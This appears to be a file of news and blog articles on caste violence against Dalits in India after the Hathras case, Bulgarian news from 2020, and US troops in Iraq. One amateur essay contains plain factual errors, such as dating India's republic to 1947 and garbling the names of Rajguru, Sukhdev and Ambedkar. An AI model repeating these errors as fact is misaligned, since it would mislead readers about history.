1,"COUNTERVIEW.ORG Voluntary blogging platform By Aathira Konikkara In October, Martin Macwan, a Dalit activist organised a tribute to the 19-year-old Dalit woman who was gangraped and assaulted in Hathras, Uttar Pradesh. Macwan is one of the founders of a Gujarat-based non-profit, Dalit Foundation, which works for the empowerment of Dalit communities. In a programme named Bhim Kanya, people across villages in several states including Uttar Pradesh, Odisha, Rajasthan, Gujarat, Bihar, Maharashtra and Telangana, predominantly from Dalit communities, applied turmeric on representational images of the 19-year-old woman. According to Macwan, over thirty thousand people, across a thousand villages, participated in the programme held on 14 October. On 1 October, a division bench of the Allahabad High Court took suo moto cognisance of the Hathras crime. The court said that the incidents following the Dalit woman’s death on 29 September had shocked its conscience. Unfazed by the pleas of the victim’s family or the presence of the media, local police officials had burned her body late at night and prevented her family from performing her last rites. The bench said that the Hathras victim was entitled to “honourable, decent and dignified last rites/cremation to be performed by her family members in keeping with the customs and traditions followed by the family.” Among other things, the court noted that the victim’s mother wished to apply turmeric on her as part of the last rites but was not allowed to do so. Macwan said that society believed that “Dalits do not even have the last wish.” He described the significance of the turmeric ritual among Dalit communities and why it was central to the programme. “This is a cultural issue that whenever people die without marriage, they apply haldi because that was something to be applied at the time of wedding.” The banner designed for the event read, “Dalit bitiya ko izzat se jeene bhi nahi diya, izzat se marne bhi nahi diya”—The Dalit daughter was neither allowed to live with dignity, nor die with dignity. The idea was for the participants at the programmes to apply turmeric to copies of this poster. In villages where the posters could not be accessed, they drew their own depiction of the Dalit woman. Macwan said that it was necessary to mobilise people in rural areas. The Dalit Foundation discovered that many did not know of what happened in Hathras until they were informed by the organisation’s grassroots volunteers. “To the surprise of our colleagues, the amount of response that came from women was something they have not been able to understand,” Macwan added. Describing the turmeric ritual as a culturally powerful medium, he said, “When women brought out the haldi from their own houses and when they were applying it, they went through that personal experience as if they are doing that to their own loved ones. And something they have suffered themselves as being women, as Dalit women.” While people from Scheduled Castes and Other Backward Classes participated in large numbers, Macwan said that the participation of women from the Valmiki community was particularly remarkable. The 19-year-old from Hathras was from a Valmiki community, which is a Dalit sub-caste. “Normally they are never part of these programmes,” he said. “We saw that it was these women who were explaining to the other people that what wrong had happened. They understood it better than what I could describe. This was the reason why we did this programme, it had to be symbolic, yet very powerful and also give a political message.” The choice of date to hold the Bhim Kanya programme was also significant—it was on 14 October 1956 that BR Ambedkar converted to Buddhism in Nagpur along with lakhs of followers. I also spoke to Pradip More, the deputy director of the Dalit Foundation. He said that the turmeric ritual programme was not officially organised as a protest. “Why not have a different kind of protest where we will not say it is a protest but we will raise the issue of dignity of Dalit women,” More said. He added that the programmes held at the village level were called prerna sabhas, which literally translates to inspiration meeting. According to More, though these sabhas stuck to their purpose of paying last respects to the Hathras victim, and refrained from slogans and other marks of a protest, they still faced upper-caste opposition in many villages in Uttar Pradesh, Chhattisgarh and Madhya Pradesh. However, the local Dalit communities were able to go ahead with the event. “The community is more organised now,” he said. “They are able to fight back.” He added that the Dalit Foundation’s ground volunteers in the villages are doing follow-up meetings with participants of the programme to keep tabs on any threats they may face from upper-caste communities. Kuldeep Kumar Baudh, the convenor of Bundelkhand Dalit Adhikar Manch, a network of Dalit social activists and civil-society organisations, also noted that the Bhim Kanya program faced some backlash from upper caste groups in Uttar Pradesh. He told me that the upper-caste Thakur community felt threatened by the programme. “On 14 October, we could not organise it in all the villages where it was planned,” Baudh said. “The tyranny of Thakurs is rampant in Bundelkhand region. When they came to know that such a programme was being organised, they questioned it. This is an area prone to atrocities against Dalits.” For the last three years, Baudh’s organisation, in association with the Dalit Foundation, has been working for the rehabilitation of Valmiki families forced to engage in manual scavenging. Many of the same families had mobilised to representationally offer haldi to the Hathras victim at prerna sabhas held in Jalaun district in Uttar Pradesh. But because of disruption by upper-caste villagers, the sabhas in around 20 villages were postponed to the following day. Altogether, the Bhim Kanya programme was organised in 65 villages in Jalaun. Referring to the upper-caste communities, Baudh added, “They fear that it will grow into a movement. They think that we are doing this today, tomorrow we will take to the streets.” Kalandi Mallick, a Dalit activist who mobilised prerna sabhas in eastern Odisha, echoed Baudh’s sentiments. “The incident happened in UP and people here in remote villages in Odisha protested,” he said. “Dalit people, in UP or in Odisha, feel tied together by what the society inflicts on them and so they extend solidarity to each other.” He referred to a massacre in 2006 when 14 Adivasis who were protesting against land acquisition for a Tata steel plant in Odisha’s Kalinganagar village were killed in police firing. “All the world’s Adivasis had converged here in solidarity,” Mallick said. “Sonia Gandhi had come to the village and held Adivasi children in her arms. People understood that if one Adivasi is harmed, all the world’s Adivasis will come together. Similarly, upper-caste people know that if one Dalit is harmed, all Dalits in Odisha, all Dalits in the world will gather. Dalits will get organised.” P Eshwaramma, an activist working with the Dalit Foundation in Telangana’s Narayanpet district, mobilised similar events in four villages in the state. “Women broke down on hearing the details of what happened to the girl in Hathras,” she said. “They said it does not matter where the crime has happened, we must feel shaken from within. We have to organise more such programmes,” she said. “People are indifferent to the deaths of Dalit children.” Indu Rohit, the deputy director of Dalit Shakti Kendra, a vocational training centre affiliated to the Dalit Foundation, said that the Hathras case was not an anomaly and that Dalit women faced a disproportionate extent of sexual violence. Rohit said that young girls under the care of DSK have often voiced fear of violence from upper-caste men in their neighbourhoods, perceiving themselves to be under threat even on their way to relieve themselves. She emphasised that sexual violence against Dalit women occurs in the larger context of routine exertion of power by upper caste communities. Rohit narrated an anecdote told to her by a girl from Madhya Pradesh, about the access to water from a handpump in a village in the state. “The handpumps there were installed by the government,” Rohit said. “But the dominant castes show their power here as well and get to use the handpumps first, ordering everyone else to stand aside. Dalit women are the last ones who can access water.” The girl refuted the casteist practice and stood ahead in line to use the handpump. “A Brahmin woman asked her to move aside and started fighting,” Rohit continued. “When the girl continued to resist, she became quiet. After the girl filled water and left, that woman spent an hour to clean the handpump.” Rohit described the reaction of Dalit women in rural Gujarat to the Hathras case. “The sensitive aspect that angered women the most, when they were told about it in the villages, was that even after she suffered such brutalisation, her mother was not allowed to perform the final rites,” Rohit said. “She only asked for a chance to apply a coat of haldi.” The commonality of the ritual for Dalit communities deeply resonated with women across states. Volunteers of the Dalit Foundation plan to collect the turmeric from the prerna sabhas that were held across the country, and are in the process of deciding their next course of action. One possibility is that the turmeric will be used to build a sculpture of the Buddha showcasing the abhaya mudra, a hand gesture representing fearlessness. Referring to Dalit communities, Macwan said, “What bothers me the most as an activist in the last 40 years is that the state continuously conveys a sense of fear to the population,” Macwan said, referring to the Dalit populace. “Freedom is associated with the absence of fear. That is the message we want to communicate; that we are not afraid.” — Courtesy: Caravan Magazine Fill in your details below or click an icon to log in: You are commenting using your WordPress.com account.

1,"India the country that was under British colonial rule for years finally got freedom on 15th of August 1947 after enormous sacrifices. Father of the Nation Mohan Das Karamchad Ghandi first fought Apartheid in South Africa and then turned it’s attention to India. The British Colonial rule started from establishment of East India Company which was founded on 31st December 1600 by John Watts & George White. The company kept expanding itself from time to time till the Governor Generals fully colonialised the country. The country gave immense sacrifices cutting across the religious lines. Khan Abdul Gafar khan a Muslim known as Frontier Ghandi played an instrumental role in the freedom struggle of the country and legendary poetic Sir Mohammed Iqbal too contributed significantly in the freedom struggle. It needs no explanations. Baghat Singh, Rajdeep & Sukhguru were hanged for the Freedom of India. Dr. Baba Rov Ambadkar a dalit also known as Father of India Constitution worked very closely with Mahatma Ghandi for the freedom of India. By naming some Muslims, some Hindus and a dalit the message I want to send across is that India was freed from the clutches of the colonial rule with the collective efforts of People of India including people of all the religions and races. On 26th of January 1947 India became “Republic” By implementing it’s own Constitution and the Preamble of the Constitution makes it is clear that India is a ” Secular ” Country that puts no restrictions of any sort unless on any individual or group for carrying out religious or social activities. India is home to people of different faiths and castes, “Dalits” are one among them. Dalits fall under schedule caste category.Till the implementation of Constitution they were referred as ” Untouchables ” . But with the implementation of Constitution it was declared illegal. However still the condition of the Dalits is in no way better. Before introducing the word “Dalits” they were called Harijans. Mahatma Ghandi called untouchable Harijinas “Children of The God Vishnu or simply ” Children of God ” .But even after Gandhi called them so these Dalits are believed and still do the job that a high class or a person with higher cast will never do. Still in India the same Dalit community that gave them Constitution is being treated as if they don’t fall in the human category. They aren’t allowed to take water from the well that’s being used by the people of other high castes, they aren’t allowed to enter the temples, they aren’t allowed to touch the belongings of higher class people and above all they still have to sit on floor when everyone else is sitting on chair. Be it shopping malls, temples, schools, meetings or any other place of public attraction Dalits are facing discrimination. They don’t have any ray of hope of getting better. And in the present times the crimes against them are continuing unabated. In a recent incident a meeting of urban body where all the Elected Panchs and sarpanche were present and were sitting, a dalit elected representative was made to sit on floor. Not only this day in and day out the videos of dalits being tied and beaten have become a new norm. In one heart wrenching incidents a dalit who had taken water from the well of upper cast people was made to drink the urine of upper caste population after being tied. In 21st century where caste doesn’t matter this is the condition of Indian Dalits. Inter caste marriage is a far away a thing. And unfortunately the government that claims of having law and order under control is silent on all the incidents and they a have not a word to speak about it. A dalit MLA from BJP visited a temple and after she left the temple it was cleaned. What more to prove the condition of Dalits in India. In odisha 40 families were barred from entering village and the reason was that a Dalit girl had plucked a flower. In Tamil Nadu Dalits are forced to drop their dead bodies from bridge so that the upper caste isn’t annoyed. The Dalits face crimes just because they ride their bike in front of an upper caste. Such is worst situation of Dalits in India. What sort of crimes Dalits face against themselves on daily basis shivers me up. Their lives have become hell and they have no way out. According to news published by NDTV on October 13 one 65 years old Dalit man was forced to drink urine in UP. Even an old aged Dalit man isn’t safe. A news Published by Deccan Herad on October 15 says” Another Dalit Girl was raped in UP” . The word another must signify the continuing process of Dalit women being raped. According to National crime records bureau ‘Every day 6 Dalit women are being raped”. And the same bureau says ” Every 15 mins a crime is committed against Dalits “. The record of the bureau is enough to make one image how worst is the situation of Dalits. Beating them, making them drink urine and humiliating them and then making the video viral has become a new norm. According to a verified Twitter handle @DalitRights “Almost 3 out of 10 Dalits are still prevented from entering police stations” Look this is the situation with police stations. When they aren’t allowed to enter police stations how will they have their rights assured and how they will report crimes against themselves when they aren’t allowed inside Police stations. Not even thinking about FIR being registered. According to the same handle ” At least 1 in every 10 villages are denied access to polling booths or forced to form a separate line” Well at the time when what they have been calling it ” Festival of Democracy ” Dalits have to face discrimination . When will this demarcation go? When will the Dalits be treated as humans, leave alone being treated equals? The handle says “Every 1 out of 3 public health workers refuse to visit home” They even have been sidelined in the health sector. Be it shopping malls, temples, schools, meetings or any other place of public attraction Dalits are facing discrimination. They don’t have any ray of hope of getting better. And in the present times the crimes against them are continuing unabated. A recent video from Rajasthan posted on Twitter showed how the two young Dalits boys were tied up surrounded by people and were seen crying for mercy. Not to forget a Dalit named Kocheril Raman Narayanan has severed as President of India from 1997 to 2002 and was the first one to occupy the highest office of the country. A news published in “The Indian Express” says” Dalit lawyer killed over anti Brahmin posts in Gujarat:SIT” Well where the crimes against them are growing the voices against the crimes have come up rapidly. A recent campaign #Dalitlivesmatter is making people aware about the crimes against Dalits and using this campaign voice against crimes are being leveled up. Now home crimes are registered and action is being taken so that Dalits also get a life they deserve. Dalit lives really matter as every life matters.

1,"'Unseen' News and Views – By Baher Kamal & The Like Just add your e mail address here! Email Address: Follow Human Wrongs Watch HYDERABAD, India , Nov 2 2020 (IPS)* – Shabnam*, a young woman from Northern India’s Haryana state, is two years away from becoming a law graduate. She sees parallels between her own rape and that of the 19-year-old Maha Dalit woman whose brutal rape and torture by a group of men from a “dominant” or “higher” caste in the neighbouring state of Uttar Pradesh triggered nationwide protests.  Women listen to the news in a village comprising mainly of Dalits in Uttar Pradesh. After a 19-year-old young woman was murdered and raped in the state last month it triggered nationwide protests. Credit: Stella Paul/IPS “She was a Valmiki like us, from a landless and poor family like ours. They raped her, brutalised her and when she died, they burnt her body without the consent of her family. And even after all of that, they would not allow her family to talk about it and threaten them to keep quiet. This is exactly what I and my family have experienced and what we continue to go through. The only exception is that I am still alive,” Shabnam tells IPS in Hindi. The 19-year-old young woman eventually died of her injuries. But just like her, Shabnam also belongs to the Maha Dalit – India’s most marginalised and oppressed community formerly known as “untouchables”. The death of the young woman focused a spotlight on the sexual violence faced by Dalit women in India, who number some 100 million according to a discussion document by Navsarjan Trust (India), FEDO (Nepal) and the International Dalit Solidarity Network. “Violence, including rape and gang rape, have been systematically utilised as weapons by dominant castes to oppress Dalit women and girls and reinforce structural gender and caste hierarchies,” a soon-to-be-released report by Equality Now, a global non-profit which promotes human rights and equality, and the local charity Swabhiman Society, states. “In the northern state of Haryana, where Dalit make up around one-fifth of the state’s population, a deeply-rooted caste-based and patriarchal society still flourishes. There are high rates of violence against women – data from the National Crime Records Bureau in 2018 indicates that nearly 4 women are raped every day in this state alone,” the report further states. Titled “Justice Denied: Sexual Violence and intersectional discrimination: Barriers to Accessing Justice for Dalit Women and Girls in Haryana, India”, the report draws from Swabhiman Society’s experience of working directly with Dalit survivors of sexual violence in Haryana over the past decade and highlights insights from this work. Shabnam was a minor when she was gang raped in 2013. Over the past seven years, even as her case has gone to trial, there have been several attempts and threats on her life for which she was eventually granted court protection. “People think rape is a single crime. But for Dalit rape victims, it’s just the beginning of a lifelong chain of crimes and struggles: mental abuse, fear, intimidation, threats, denial of basic rights, denial of education and a decent livelihood – the list is very long. In fact, once you are raped, you stay a victim all through your life,” Manisha Mashaal, founder of Swabhiman Society, tells IPS in Hindi. Mashaal, a Dalit women’s rights defender and lawyer, is helping Shabnam and many other young women in their fight for justice. According to the National Crime Record Bureau (NCRB), a federal agency, cases of physical attacks on women have been increasing. In 2019 alone, says NCRBs latest report, there were over 405,861 cases of assaults on women — 7 percent more than was reported in 2018. The crimes include beating, stripping, kidnapping and rape. Of these, 13,273 assaults, which included 3,486 cases of rape, were against women from Dalit communities. Jacqui Hunt, the Europe and Eurasia Director of Equality Now, says widespread under-reporting and problems registering sexual assaults with the police mean that the true figures are likely to be considerably higher. “As a consequence of gender, caste and class inequalities, Dalit women and girls are subjected to multiple forms of subjugation, exploitation, and oppression. Sexual violence, including rape and gang rape, has been perpetrated against them by men from dominant castes as a mechanism that reinforces India’s deeply entrenched structural hierarchies. Women’s bodies are being used as a battleground to assert caste supremacy and to keep women ‘in their place,’” Hunt tells IPS. Mashaal believes that almost 80 percent of Dalit women who are raped do not report the crime because of political and social pressure as the women and their families are usually threatened by the perpetrators. Besides, Mashaal says, a majority of the sexual and gender-based violence (SGBV) survivors are minor Dalit girls, while NCRB data for child rape survivors does not differentiate according to caste. To help break the cycle of silence on crimes against Dalit women and girls, in 2013 Mashaal founded Swabhiman Society – a charity that provides various services, including legal and psychological support to Dalit survivors of SGBV. “We currently have 25 women who work with us off and on, but this is a safe place for hundreds of women who have been stigmatised, brutalised and yet have nobody else to turn to,” says Mashaal. Mashaal started the society because she noticed few organisations were aiding Dalit survivors of SBGV and that there was a lack of knowledge and awareness among the community about their legal rights to justice or the procedure to follow. In several cases, they would be dictated to settle out of the court by the Khap Panchayat – a powerful, traditional, community assembly run by the landowning Jat community, which decides on village affairs. The decisions of the Khap are often controversial and considered anti-Dalit, but few dare oppose them fearing reprisals. Mamta*, another woman Mashaal represents, was a minor when she was gang raped by “dominant” caste men in 2012. When the Khap Panchayat ordered that she had to marry one of her rapists, her father – a farmhand and daily wage earner — was too scared to oppose the decision. For months Mamta was locked in a small room and repeatedly raped by both her ‘husband’ and his friends and relatives. “It was like a cage. I lived in a small room. My husband would lock the door from outside. He would not otherwise touch me as I was a Dalit but would forcibly have sex whenever he wanted. Every day, he would bring other men and they would also rape me. “I was like a fly stuck in mud – I could not live and could not fly away either,” Mamta, who is now 26, tells IPS in Hindi. Eventually Mamta managed to escape and discovered the Swabhiman Society. There she met many other women who had also experienced similar abuse and brutality. Together they have received counselling, awareness training about laws on rape and sexual attacks on women. But most important of all, they have gathered the courage to demand justice in a legal court. According to Hunt, Dalit women lack economic power and are often reliant on dominant castes for their livelihoods. When survivors of sexual assault or their families are dependent for jobs or other sources of income from someone who is from the same caste as an assailant, or the perpetrator is also their employer, accessing justice for sexual violence becomes even more problematic “Culprits and their associates often wield their economic power to silence survivors and witnesses. This includes coercing survivors or victims’ family members into settling cases out of court, or hounding them from their home and village. “Our forthcoming report gives an indication of how common this problem is. In almost 60 percent of the cases we studied, survivors were forced into a compromise, many times caused by threats of economic retaliation,” Hunt says. According to the recent data published by the Census of India, 71 percent Dalits are landless labourers who work on land they do not own. According to the Agriculture Census, in rural areas, 58.4 percent Dalit households do not own land at all. This gets grimmer in Dalit-dominated states such as Haryana, Punjab and Bihar, where 85 percent do not own land. “This is the reason why there is continuous gruesome sexual assaults on Dalit women because they are thrice-vulnerable. First, because of their caste, second, because of their gender and third, because of their landless status,” says Mashaal. Independent studies have established this as well. According to a 2018 study by Reena Kukreja, an assistant Professor at Queens University, Canada, the Dalit community in Haryana, “with over 80 percent of Dalits living in rural areas, they are dependent on the three landowning castes for agricultural wage labour as their primary source of livelihood.” The study explores the link between land rights and gender violence, especially in the context of Dalit women’s marriages in Haryana. The women Mashaal represents don’t believe there is a silver bullet for the endemic SGBV against women in their community. It is why a number of them are pursuing a college degree, especially in law. “Every time we go to court, we see the perpetrators hiring 10 to 15 lawyers to fight their cases. They hire big law firms. On the other hand, a Dalit woman victim can hardly afford a single lawyer. It is very frustrating. So, we encourage the girls who come here to go back to school and study law. We must build our own network of women lawyers who will fight and win every single case of Dalit rape,” Mashaal says. Presently, at least 10 women from the Swabhiman Society are studying law, says Shabnam. Pooja* is another young Dalit woman whom Mashaal is assisting. When Pooja was only 17 she was kidnapped by 12 men who took turns to rape her. Pooja – the youngest of the women — just passed her last school exams and plans to enrol in a law school. Though her enrolment has been delayed by COVID-19 lockdowns. “I will apply to a private college if needed and take up a job to pay the fees, but will not give up on becoming a lawyer,” Pooja tells IPS as Mashaal and the other Dalit women in the room break into a cheering chorus of support pledging to “make sure that happens”. Meanwhile, the Equality Now / Swabhiman Society joint report provides recommendations for improvement of the police, medico-legal and judicial processes in Haryana to improve access to justice for survivors of sexual violence, particularly Dalit women and girls. *Not her real name.

1,"Veteran civil rights and #BlackLivesMatter campaigner Professor Angela Davis has given a video statement about the need for increased solidarity with the #DalitLivesMatter movement. The statement can be viewed on YouTube and as a text transcription below:   Transcription of Professor Angela Davis statement (uploaded on 27th October 2020) Greetings. It is a major honor to be able to participate in this press conference highlighting the need for solidarity between Dalit people in India and black people in the U.S., in conjunction with the campaign protesting the sexual assault and murder of a young Dalit woman in Uttar Pradesh and, of course, the many victims of violence enabled and condoned by the State. As Dalit activists and intellectuals have pointed out, the history of making connections between our two communities stretches back to the 19th century when most U.S. black people were enslaved. We deeply appreciate the solidarity that has been generated on so many occasions by Dalit activists. However, we must also be critical, self-critical, of our own failure to produce meaningful and transformative solidarity with Dalit people. Most recently, Dalit feminists have on several occasions made passionate calls for solidarity, especially with their efforts to resist the interminable assaults, particularly assaults involving sexual violence, against Dalit women. And so, we salute those who are standing up to resist casteism and patriarchy, capitalism. As we here in the United States attempt to move forward in our struggles against structural racism, and state and vigilante violence, we thank you for your solidarity and recognize that it is our responsibility to join you. We need to express our rage against racial, sexual and caste-based violence in India, and we need to demand justice for the victims, the survivors, and their families. This is a time when the world is beginning to rise together to demand justice for those who are targeted by white supremacists and casteists. Therefore, we stand with those who are issuing a global cry for an end to racism and who not only say black lives matter but also Dalit lives matter and Muslim lives matter. We protest the consolidation of casteist and fundamentalist religious forces against Dalits in the service of a fascist state, where a violent form of hindutva is deployed in order to bolster capitalism. We express our deepest condolences to the family and community of the young victim of rape and murder in Uttar Pradesh. We further join those who are demanding an end to all forms of caste based and state violence in India. Thank you.

Siddaramaiah advanced that stance in the State. The defeat of senior dalit leaders Mallikarjun Kharge and Dr G Parameshwar was also because of its anti-Dalit policies.

1,"HOT: » Greek Ambassador: Bulgaria is our Most Important Economic and Trade partner in the Region #AmbassadorTalks  On January 6, Bulgaria marks 172 years since the birth of the Bulgarian poet and revolutionary Hristo Botev. Celebrations will take place across the country, BNT reported. In many places in the country, together with marking Botev’s birth, church celebrations will be held for water blessings of the military units and flags, which will be followed by the ceremony for retrieving the cross from rivers on Epiphany. Celebrations to mark Hristo Botev’s birth will take place in his birth town of Kalofer, in Sofia, Stara Zagora, Plovdiv, Haskovo, Blagoevgrad, Veliko Turnovo, Varna and Burgas. Botev was born in Kalofer in 1848. His father was a teacher and one of the most significant figures in the late period of the Bulgarian National Revival. In 1863, after completing his elementary education in Kalofer, Botev was sent by his father to a high school in Odessa, where he studied for 2 years. During this period, his ties to the Russian revolutionary movement and his political views began to form. In 1867, he returned to Kalofer to teach in place of his ill father. In May, he made a public speech against the Ottoman authorities, which led to his exile and move to Romania seeking asylum. From 1869 to 1871, Botev worked again as a teacher in Bessarabia, keeping close relations with the Bulgarian revolutionary movement and its leaders. In June 1871, he became editor of the revolutionary emigrant newspaper ""Word of the Bulgarian Emigrants"", where he published early poetic works. He closely collaborated with the Russian revolutionists and worked for the Russian newspaper Svoboda (Liberty). In 1873, he worked on the satiric newspaper “Alarm Clock” and published political fiction aimed at wealthy Bulgarians. He continued to write poetry with themes such as revolutionary zeal and freedom, with two of his more famous poems being, “In the Tavern” and “My Prayer”. After the outbreak of the 1876 April Uprising, which had the goal to liberate Bulgaria from the five-century Ottoman rule, Botev began organising a troupe to enter Bulgaria and help the rebels. On 30th of May, 1876, Botev and part of the troupe seized a ship and re-entered Bulgaria from Romania near Kozloduy. Hristo Botev was killed on 1st of June 1876. Since his death, many streets, cities and landmarks have been named after the revolutionary, including “Botev Point”, “Botev Peak”, and “Botevgrad”. A football stadium in the South Bulgarian city of Plovdiv was named “Hristo Botev” in 1961 and is home to the professional football club “Botev Plovdiv”.

1," Forced to ""live without water, in the 21st century, in a European Union country"": Bulgarian Yana Stoyanova is not bemoaning climate change, but the incompetence of the authorities which has left some 100,000 people with an acute water shortage. Accountant Stoyanova does not live in an isolated backwater, but around 30 kilometers (19 miles) from the capital Sofia. She is at the sharp end of a crisis which has led to the environment minister being charged with mismanagement and forced to resign. It also prompted a parliamentary vote of no confidence on Wednesday in the government -- which it survived. But the scandal has fed public anger at the failures of those running the EU's poorest country. The western Bulgarian city of Pernik should have a plentiful supply of water from the nearby Studena dam. However, the reservoir there is practically empty, with most of the bed now lying exposed. Pernik residents meanwhile are receiving murky, undrinkable water -- and even that only between 4pm and 10pm (1400-2000 GMT). For three months now, the daily routine for 36-year-old Stoyanova and her electrical engineer husband has revolved around the shortage. ""When we get back from work at 7pm, we run to take a shower and try to wash everything before 10pm,"" she explains, with buckets and containers being filled before the taps run dry. ""I try to cook with mineral water, I wash dishes with it and of course I only drink mineral water,"" says 56-year-old Adelina Ivanova, who has to haul the bottles up seven flights of stairs. ""The meaning of your life in a given day is: 'Will I manage to take a shower?', and being so happy when you do,"" Ivanova says. ""It's absurd for a civilized person to be reduced to that."" - 'Corruption, not climate' - Bulgaria has had a drier winter than normal and during 2019 received 25 percent less rainfall than average, in what was the second-hottest year on record. But residents are clear on where they place the blame for the crisis. ""We are victims of negligence and corruption, not the climate,"" sighs 67-year-old Ivan Dragov, who used to work in the area's water distribution network. Prosecutors accuse the former Environment and Water Minister Neno Dimov of ignoring warnings about the falling water levels at the reservoir, as well as continuing to allow a local steelworks to draw water from it. ""Thirty years ago, around a dozen businesses were operating in the area and the water level was monitored daily,"" says Dragov, adding that there were no shortages for residents back then. Pernik's former mayor has also been charged with abuse of power over her refusal to enforce rationing during her campaign for re-election last autumn -- which she went on to lose anyway. On Saturday, hundreds of residents took their anger to government headquarters in Sofia, shouting ""resign!"", ""killers!"" and ""Mafia!"" - 'Bottomless barrel' - The crisis in Pernik has also thrown a spotlight on Bulgaria's dilapidated water infrastructure, which results in around 60 percent of water being lost through leaks. In Pernik, the pipes date from the 1960s and 70s and the losses can reach up to 75 percent. The new Environment Minister Emil Dimitrov has compared the network to a ""bottomless barrel"". The leaks leave up to 315,000 people -- in a country of seven million -- facing regular water shortages, particularly in summer. The government has said that cutting down on these losses is a priority, and has pledged 900 million euros ($990 million) to renew this infrastructure in the next two years. However, the total cost of bringing it up to scratch is estimated at six billion euros. If the situation in Pernik does not improve, authorities have warned that water could run out completely by April. Even to maintain the current six hours of daily supply, the government is having to divert water from another reservoir, with 13 kilometers of pipes still needing to be installed to complete the link. As for Stoyanova, the crisis has only confirmed her bleak opinion of her country's situation. She is encouraging her daughters, aged 5 and 9, to learn English. ""They don't have a future here.

1,"Print Thousands of Bulgarians held a fourth day of protests in Sofia and several other cities on July 12 against government corruption and said more similar rallies are scheduled to take place July 13 ahead of another nationwide protest later in the week. Thousands of people filled a central area in Sofia near the presidency and the Council of Ministers demanding the resignation of the conservative government. Protests also took place in Burgas, Plovdiv, Varna, Blagoevgrad, and Gabrovo, according to a Radio Free Europe/Radio Liberty reporter. In Sofia, Burgas, and Varna, the protests turned into marches, with people shouting ""Resign!,"" ""Mafia!,"" and demanding the ouster of Prosecutor-General Ivan Geshev. The protests were sparked by a raid on July 9 by the Prosecutor-General's Office on the presidential headquarters. President Rumen Radev's legal affairs and anti-corruption secretary and his security and defense adviser were detained for questioning and their offices searched as part of two separate probes into influence-peddling and disclosure of state secrets. Demonstrations The searches sparked public anger and brought thousands of demonstrators onto the streets of Sofia to condemn the raids as an attack by the government and the prosecutor-general against Radev. Radev responded two days later by calling on the government and the prosecutor-general to step down. The searches came after Radev said the National Protection Service (NSO) -- which is responsible for guarding the president, prime minister, and other high officials -- should stop protecting Ahmed Dogan, the honorary chairman of the Movement for Rights and Freedoms (DPS). Protesters were also angered when people were barred from a state beach located near Dogan’s summer residence. Access to the beach was restored on July 11 under pressure from the center-right Democratic Bulgaria opposition. Radev is an outspoken critic of the cabinet of Prime Minister Boyko Borisov, accusing it of ""links with oligarchs."" Borisov has refused to resign but opponents launched an online petition aiming to gather as many as 1 million signatures to demand his ouster. The Socialist opposition in parliament also said on July 12 that they would propose a no-confidence motion against the cabinet for ""corruption"" on July 15 and appealed to protesters to back them. The protesters say their nationwide demonstration will take place the next day.

1," Bulgarians living in the UK are to protest again today in support of the anti-government rallies in Sofia and other Bulgarian towns. “The protests here continue for the second consecutive week”, Maria Spirova who has lived in Great Britain for many years told BNR. “Sometimes, up to 300 people join the protests. Bulgarians living in other British cities- Bristol, Exeter, Manchester and Birmingham are also planning protests this weekend”, Maria Spirova added. “Many people living abroad know that this type of attitude of the government towards the institutions, the citizens and the rule of law, the use of vulgar language, is what makes Bulgarians emigrate abroad. In this audio recording they found the reason why they left their home country”, Maria Spirova says commenting the audio recording with the voice of Premier Borissov, whose authenticity is guaranteed by MEP Elena Yoncheva.

1,"Print SOFIA -- Anti-government protesters returned to the streets of the Bulgarian capital, Sofia, pressing demands for the resignation of the government and the prosecutor-general. The rally on September 10 marked the 64th consecutive day of protests against the ruling conservative GERB party and its government in the Southeastern European nation’s deepening political crisis. Protesters, monitored closely by police, gathered outside the National Assembly building in Sofia, shouting, “Mafia out!” and demanding the resignation of Prime Minister Boyko Borisov’s government and Prosecutor-General Ivan Geshev. The September 10 rally appeared to take place without major incident. On September 2-3, several thousand people joined the so-called Grand National Uprising in response to what protesters say is oligarchic control over Bulgaria’s government and judicial system. Violence on that day led to scores of injuries and the arrest of 126 people, including what police described as more than 60 football hooligans. Opinion polls show that more than 60 percent of Bulgarians support demands for Borisov and Geshev to resign and for immediate parliamentary elections to be called. Borisov has said he is prepared to step down following parliamentary elections currently set for March 2021. On July 21, Borisov’s government survived a no-confidence vote in parliament, the fifth such vote since it took power in 2017. The demonstrators have protested against Borisov's government over perceived ties to the country’s powerful oligarchs. They also claim that Geshev has targeted government critics, including Socialist-backed President Rumen Radev, who has supported the protests. The protests were sparked by a raid on July 9 by the Prosecutor-General's Office on the presidential headquarters. Radev’s legal affairs and anti-corruption secretary and his security and defense adviser were detained for questioning and their offices searched as part of two separate probes into alleged influence-peddling and disclosure of state secrets. The demonstrators have condemned the raids as an attack by the government and the prosecutor-general against Radev. Radev has often criticized Borisov's government for doing too little to uproot endemic corruption and has blasted prosecutors for cherry-picking their probes and colluding with the government. Bulgaria is the European Union’s poorest country and remains corruption-ridden, according to Transparency International's corruption perception index.

Washington and Baghdad should not discuss troop withdrawal, the US State Department has said, refusing parliament's request for US soldiers to leave. Protesters in Iraq urged both the US and Iran to stop their meddling.   After Iraqi lawmakers voted to oust US troops, the US State Department dismissed their demand and said Washington and Baghdad should instead focus on fixing their alliance. ""Any delegation sent to Iraq would be dedicated to discussing how to best recommit to our strategic partnership — not to discuss troop withdrawal,"" spokeswoman Morgan Ortagus said on Friday. The US, which invaded Iraq and toppled the regime of Saddam Hussein in 2003, currently has some 5,200 soldiers on Iraqi soil. The troops are training and assisting Iraqi forces in the fight against the remnants of the defeated ""Islamic State"" (IS) militia. On Friday, the State Department said the US forces were crucial for the anti-IS effort and would not discuss removing them. Instead, the two sides should talk about ""our right, appropriate force posture in the Middle East,"" the US said. Iraqi militia head killed alongside Soleimani The latest row between Iraq and the US was triggered by a US drone attack near Baghdad airport which killed Iran's General Qassem Soleimani and powerful Iraqi militia head Abu Mahdi al-Muhandis. In a non-binding vote on Sunday, the Iraqi parliament passed a resolution asking the US troops to leave and asking the Iraqi government to formally demand a US withdrawal. In an apparent blunder, the US military's Task Force Iraq pledged to ""prepare for onward movement"" of US troops ""in deference to the sovereignty of the Republic of Iraq"" in a letter sent on Monday. However, the US officials were quick to dismiss the message as a ""draft"" that was sent by mistake. Several top US military officials have said there were no plans for US forces to withdraw. Iraq's caretaker prime minister Adel Abdul-Mahdi then presented the request to US Secretary of State Mike Pompeo during a phone call on Thursday night. Between rock and hard place Also on Friday, protesters gathered in Baghdad and southern Iraq to demand that both Iran and the US stop meddling in Iraqi politics. Both Washington and Tehran are nominally allies of the Baghdad government. Iran is ruled by Shiite clerics who also exert a large influence on the Shiite majority in Iraq. The US also has many instruments to pressure the Iraqi officials, including waivers on sanctions against Iran. Washington currently allows Iraq to import Iranian gas despite sanctions, 